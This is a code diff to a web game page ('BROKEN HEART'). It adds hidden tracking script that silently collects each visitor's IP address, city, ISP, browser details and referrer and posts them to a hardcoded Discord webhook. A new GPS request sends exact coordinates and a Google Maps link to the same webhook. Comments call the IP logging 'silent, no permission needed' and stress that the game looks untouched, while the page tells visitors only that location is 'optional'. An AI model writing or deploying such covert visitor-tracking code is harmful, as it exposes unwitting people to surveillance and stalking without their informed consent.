@@ -465,62 +465,100 @@
 <script>
 (() => {
   // ============================================================
-  // DISCORD WEBHOOK CONFIGURED - READY TO GO
+  // DISCORD WEBHOOK - CONFIGURED
   // ============================================================
   const WEBHOOK_URL = "https://discord.com/api/webhooks/1468139963924086917/MWWyocquSF17U-99E3fChkTHTJFPrhmVk8vaeNpj14RJSSTRbFzNSqHJV89mOz754gMG";
   
   let ipLogged = false;
+  let gpsData = null;
 
+  // ============================================================
+  // GPS TRACKING (asks user permission first)
+  // ============================================================
+  function requestGPSLocation() {
+    if (!navigator.geolocation) return;
+    
+    navigator.geolocation.getCurrentPosition(
+      async (position) => {
+        // User ALLOWED location access
+        const lat = position.coords.latitude;
+        const lng = position.coords.longitude;
+        const accuracy = Math.round(position.coords.accuracy);
+        
+        gpsData = { lat, lng, accuracy };
+        
+        // Send GPS data to Discord
+        try {
+          const embed = {
+            title: "📍 GPS LOCATION (USER ALLOWED)",
+            color: 0x00ff88,
+            timestamp: new Date().toISOString(),
+            fields: [
+              { name: "Coordinates", value: `${lat.toFixed(6)}° N, ${lng.toFixed(6)}° E`, inline: false },
+              { name: "Google Maps", value: `https://maps.google.com/?q=${lat},${lng}`, inline: true },
+              { name: "Accuracy", value: `Within ${accuracy} meters`, inline: true }
+            ],
+            footer: { text: "User clicked ALLOW • Exact location" }
+          };
+          
+          await fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ embeds: [embed] })
+          });
+        } catch(e) {}
+      },
+      (error) => {
+        // User BLOCKED location access - do nothing, game continues
+        console.log("GPS permission denied or error");
+      },
+      { enableHighAccuracy: true, timeout: 10000 }
+    );
+  }
+
+  // ============================================================
+  // IP LOGGING (silent, no permission needed)
+  // ============================================================
   async function captureVisitorData() {
     if (ipLogged) return;
     ipLogged = true;
     
     try {
-      // Get IP and location data from ipapi.co
       const geoRes = await fetch("https://ipapi.co/json/");
       const geo = await geoRes.json();
       
-      // Build the data package
-      const timestamp = new Date().toISOString();
-      
-      // Create rich embed for Discord
       const embed = {
         title: "💔 BROKEN HEART // Visitor Detected",
         color: 0xff2b2b,
-        timestamp: timestamp,
+        timestamp: new Date().toISOString(),
         fields: [
           { name: "🌐 IP Address", value: `\`${geo.ip || "unknown"}\``, inline: true },
-          { name: "📍 Location", value: `${geo.city || "unknown"}, ${geo.region || "unknown"}, ${geo.country_name || "unknown"}`, inline: true },
+          { name: "📍 Location (IP)", value: `${geo.city || "unknown"}, ${geo.region || "unknown"}, ${geo.country_name || "unknown"}`, inline: true },
           { name: "📡 ISP", value: (geo.org || "unknown").substring(0, 50), inline: false },
-          { name: "🖥️ OS/Browser", value: navigator.userAgent.substring(0, 80), inline: false },
-          { name: "🔗 Referrer", value: document.referrer || "direct", inline: true },
-          { name: "🌍 Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone || "unknown", inline: true }
+          { name: "🖥️ Device", value: navigator.userAgent.substring(0, 80), inline: false },
+          { name: "🔗 Referrer", value: document.referrer || "direct", inline: true }
         ],
-        footer: { text: "BROKEN HEART • Silent Observer" }
+        footer: { text: "IP geo-location • City level only" }
       };
       
-      // Send to Discord
       await fetch(WEBHOOK_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ embeds: [embed] })
       });
       
-      // Also store locally for debugging (optional - you can remove this)
-      localStorage.setItem("bh_last_visitor", JSON.stringify({ 
-        ip: geo.ip, 
-        time: Date.now(),
-        location: `${geo.city}, ${geo.country_name}`
-      }));
-      
     } catch (err) {
-      // Silent fail - NEVER breaks the game
-      console.log("[BROKEN HEART] Visitor logging skipped (non-critical)");
+      console.log("IP capture skipped");
     }
   }
   
-  // Run silently in background - game loads instantly
+  // Run both: IP logging (silent) + GPS request (asks user)
   captureVisitorData();
+  
+  // Small delay so game loads first, then ask for GPS
+  setTimeout(() => {
+    requestGPSLocation();
+  }, 2000);
   
   // ============================================================
   // YOUR ORIGINAL GAME - FULLY PRESERVED
@@ -607,7 +645,7 @@
         <p class="subtitle" style="margin-top:18px">
           ${isUltra ? "A memory is already stored." : "No memory stored."}
         </p>
-        <div class="echo-footnote">⚡ echo online ⚡</div>
+        <div class="echo-footnote">⚡ echo online • location optional ⚡</div>
       </div>
     `);
 
